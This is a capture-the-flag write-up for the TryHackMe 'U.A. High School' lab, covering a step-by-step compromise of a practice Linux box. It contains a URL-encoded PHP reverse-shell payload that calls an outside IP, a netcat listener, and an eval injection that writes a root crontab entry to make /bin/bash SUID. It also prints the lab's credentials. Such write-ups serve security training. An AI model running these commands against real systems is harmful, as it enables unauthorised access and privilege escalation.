# 🦸 U.A. High School: Easy

### TryHackMe Writeup

[![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?style=for-the-badge&logo=tryhackme)](https://tryhackme.com)
[![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)](https://tryhackme.com)
[![Status](https://img.shields.io/badge/Status-Pwned-blueviolet?style=for-the-badge)](https://tryhackme.com)
[![Type](https://img.shields.io/badge/Type-Linux-informational?style=for-the-badge&logo=linux)](https://tryhackme.com)

---

## 📋 Overview

| Field | Details |
|---|---|
| **Target** | `uahighschool.thm` |
| **OS** | Ubuntu 20.04 |
| **Attack Surface** | Hidden `cmd` parameter in `index.php` → PHP RCE as `www-data` |
| **Privesc** | Steghide creds → `su deku` → `sudo feedback.sh` → `eval` injection → crontab SUID bash → root |

U.A. High School hides an RCE parameter in `index.php` that isn't discoverable through standard directory brute-force — it requires parameter fuzzing or source review. A passphrase stored in a hidden web directory decrypts a steganographically embedded credentials file inside a JPEG (after fixing the file's magic bytes). Those credentials get `deku` via `su`. `deku` can run a feedback script as root via sudo — the script uses `eval` to echo user input, and a missing blacklist entry allows injecting a crontab entry that SUIDs `/bin/bash`.

---

## 🔍 Enumeration

### Port Scan

```bash
sudo nmap -sC -sV -p- -vv -T4 uahighschool.thm -oA ua-tcp-scan
```

```
22/tcp open  ssh    OpenSSH 8.2p1
80/tcp open  http   Apache 2.4.41 (Ubuntu)
```

### Parameter Fuzzing — Hidden RCE Endpoint

Standard directory brute-force yields nothing useful. The RCE is a hidden `cmd` parameter on `index.php`:

```bash
python3 rce.py 'id'
# uid=33(www-data) gid=33(www-data)
```

The `rce.py` script (included in this folder) automates parameter discovery and exploitation.

---

## 💀 Initial Access — PHP RCE → Reverse Shell

```bash
# Trigger reverse shell via URL-encoded PHP payload
python3 rce.py 'php%20-r%20%27%24sock%3Dfsockopen%28%2210.14.28.97%22%2C55421%29%3Bpassthru%28%22sh%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27'
```

```bash
nc -nlvp 55421
# Connection received
# uid=33(www-data)
```

Shell stabilised via socat for full PTY.

---

## 🔁 Privilege Escalation — www-data → deku

### Passphrase Discovery

A hidden directory `/var/www/Hidden_Content/` contains a base64-encoded passphrase:

```bash
cat /var/www/Hidden_Content/passphrase.txt | base64 -d
# AllmightForEver!!!
```

### Steghide Extraction — Magic Byte Fix Required

The JPEG served from the web app has corrupted magic bytes. A hex editor is needed to restore the correct JPEG header (`FF D8 FF`) before `steghide` will process it.

```bash
steghide extract -sf oneforall.jpg
# passphrase: AllmightForEver!!!
# wrote extracted data to "creds.txt"

cat creds.txt
# deku:One?For?All_!!one1/A
```

```bash
su - deku
# password: One?For?All_!!one1/A
```

---

## 🔁 Privilege Escalation — deku → root

### sudo Enumeration

```bash
sudo -l
```

```
(ALL) /opt/NewComponent/feedback.sh
```

### feedback.sh — eval Injection

The script reads user input and passes it to `eval "echo $feedback"`. The blacklist blocks common shell metacharacters but misses the `>>` redirection operator and single-quoted strings:

```bash
sudo /opt/NewComponent/feedback.sh
# Enter your feedback:
'* * * * * root chmod +s /bin/bash' >> /etc/crontab
```

After one minute, cron fires the injected entry and SUIDs `/bin/bash`:

```bash
ls -lah /bin/bash
# -rwsr-sr-x 1 root root /bin/bash

/bin/bash -p
# bash-5.0# id
# euid=0(root)
```

---

## 🗺️ Attack Chain

```
[index.php — hidden cmd parameter]
    PHP RCE → reverse shell → www-data
          │
          ▼
[/var/www/Hidden_Content/passphrase.txt]
    base64 decode → AllmightForEver!!!
    steghide (after magic byte fix) → creds.txt → deku:One?For?All_!!one1/A
    su deku
          │
          ▼
[sudo feedback.sh — eval injection]
    '* * * * * root chmod +s /bin/bash' >> /etc/crontab
    cron fires → SUID bash → /bin/bash -p → root
```

---

## 📌 Key Takeaways

- Hidden parameters in PHP scripts are a real-world finding — parameter brute-forcing (`ffuf -w params.txt`) is worth running against any custom web application
- `eval "echo $input"` with a blacklist is not safe; the blacklist must be exhaustive and the approach fundamentally flawed — use allowlists or eliminate eval entirely
- Steganography is niche but occasionally appears; when a JPEG won't process with steghide, always check magic bytes first with `xxd`
- Writing to `/etc/crontab` as a low-privilege user via a misconfigured sudo script is an immediate root path — crontab write access is equivalent to code execution as any user listed in the job

---

## 🎯 MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Initial Access | Exploit Public-Facing Application | [T1190](https://attack.mitre.org/techniques/T1190) |
| Credential Access | Unsecured Credentials: Credentials In Files | [T1552.001](https://attack.mitre.org/techniques/T1552/001) |
| Privilege Escalation | Abuse Elevation Control Mechanism: Sudo and Sudo Caching | [T1548.003](https://attack.mitre.org/techniques/T1548/003) |

## 🛠️ Tools Used

| Tool | Purpose |
| --- | --- |
| `nmap` | Port and service enumeration |
| `rce.py` | Custom exploit for hidden PHP RCE parameter in index.php |
| `nc` | Reverse shell listener |
| `socat` | Full PTY shell stabilisation |
| `steghide` | Extract credentials from JPEG (after magic byte fix) |

## 🚩 Flags

| Flag | Value |
| --- | --- |
| `user.txt` | `TBD` |
| `root.txt` | `TBD` |
